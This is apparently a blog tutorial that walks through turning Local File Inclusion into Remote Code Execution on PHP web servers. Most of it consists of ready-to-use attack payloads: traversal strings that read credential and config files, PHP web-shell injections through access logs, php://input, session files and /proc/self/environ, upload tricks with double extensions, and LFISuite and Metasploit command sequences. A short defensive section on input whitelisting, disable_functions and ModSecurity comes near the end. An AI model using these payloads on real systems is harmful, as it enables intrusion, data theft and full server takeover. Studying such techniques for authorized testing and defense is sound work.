---
title: "Exploiting LFI to RCE: All Possible Attack Vectors"
date: "2025-02-03"
author: "Sumon Nath"
tags: [LFI, RCE, cybersecurity, web exploitation, penetration testing, security]
---

# Exploiting LFI to RCE: All Possible Attack Vectors

Local File Inclusion (LFI) is a critical web vulnerability that allows an attacker to include files on a server. When properly exploited, LFI can escalate into Remote Code Execution (RCE), granting full control over the system. This guide covers all possible techniques to pivot from LFI to RCE.

---

## **1. Understanding Local File Inclusion (LFI)**

### **What is LFI?**
LFI occurs when an application allows user input to specify files for inclusion without proper validation. Attackers can use this to:
- Read sensitive files (`/etc/passwd`, `wp-config.php`)
- Execute arbitrary code if the server is misconfigured
- Exploit vulnerable services for privilege escalation

### **Common LFI Vulnerable Endpoints**
- `?page=../../../../etc/passwd`
- `?file=../../../../../var/log/auth.log`
- `?template=../../../proc/self/environ`

---

## **2. Enumerating Files for LFI**

### **Checking System Files**
```bash
?page=/etc/passwd
?page=/proc/self/environ
?page=/var/log/auth.log
```

### **Web Application Configurations**
```bash
?page=../../../../../var/www/html/config.php
?page=../../../../../var/www/html/wp-config.php
```

### **Log Files for Code Injection**
If an application logs HTTP requests, attackers can inject PHP code and include the logs.
```bash
curl "http://target.com/?page=/var/log/apache2/access.log" -A "<?php system($_GET['cmd']); ?>"
```
Now, access the log file:
```bash
http://target.com/?page=/var/log/apache2/access.log&cmd=id
```

---

## **3. Escalating LFI to RCE**

### **1. PHP Wrappers for Code Execution**
#### **Using `php://filter` to Read Source Code**
```bash
?page=php://filter/convert.base64-encode/resource=index.php
```
Decode the output using:
```bash
echo 'BASE64_ENCODED_CONTENT' | base64 -d
```

#### **Using `php://input` for RCE**
If `allow_url_include` is enabled:
```bash
curl -X POST -d "<?php system($_GET['cmd']); ?>" "http://target.com/?page=php://input&cmd=id"
```

### **2. Log Poisoning for Remote Code Execution**
If you have access to writable logs, inject PHP code into them:
```bash
curl -A "<?php system('id'); ?>" http://target.com/
```
Now, include the log file:
```bash
?page=/var/log/nginx/access.log
```

### **3. Session File Injection**
If session files are stored in `/tmp/sess_<session_id>`:
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Then, include the session file:
```bash
?page=/tmp/sess_abc123&cmd=id
```

### **4. Exploiting Upload Functionality**
If a file upload function allows `.php` files:
1. Upload `shell.php`
2. Include it: `?page=uploads/shell.php&cmd=id`

If only `.jpg` files are allowed, use double extensions:
```php
shell.php.jpg
```
And try including:
```bash
?page=uploads/shell.php.jpg&cmd=id
```

### **5. Using `proc/self/environ` for Execution**
Some servers expose environment variables in `/proc/self/environ`, which can be used to inject code.
```bash
?page=/proc/self/environ
```
Inject PHP payload via User-Agent:
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
```
Access the file to execute:
```bash
?page=/proc/self/environ&cmd=id
```

---

## **4. Automating LFI to RCE Attacks**

### **Using LFISuite**
```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 LFISuite.py -u "http://target.com/?page=FUZZ"
```

### **Using Metasploit for LFI Exploitation**
```bash
msfconsole
use exploit/multi/http/php_include
set RHOSTS target.com
set TARGETURI /vulnerable.php?page=
exploit
```

---

## **5. Defending Against LFI Attacks**

### **1. Input Validation**
- Use whitelisting instead of blacklisting.
- Restrict file access to necessary directories.

### **2. Disable Dangerous PHP Functions**
In `php.ini`, disable dangerous functions:
```ini
disable_functions = system, shell_exec, exec, passthru
```

### **3. Prevent Log Poisoning**
- Disable writing logs to web-accessible locations.
- Sanitize user input before logging.

### **4. Use Web Application Firewalls (WAFs)**
Deploy **ModSecurity** to filter LFI payloads:
```bash
sudo apt install libapache2-mod-security2
sudo systemctl restart apache2
```

---

## **6. Conclusion: From LFI to Full System Compromise**

LFI is a dangerous vulnerability that, when combined with improper configurations, can escalate into full Remote Code Execution. Understanding various LFI exploitation techniques allows penetration testers and security researchers to assess and mitigate risks effectively.

🚀 Stay vigilant, test your web applications, and secure your systems!

---

💡 **Want more security insights?** Stay tuned for advanced web exploitation techniques!

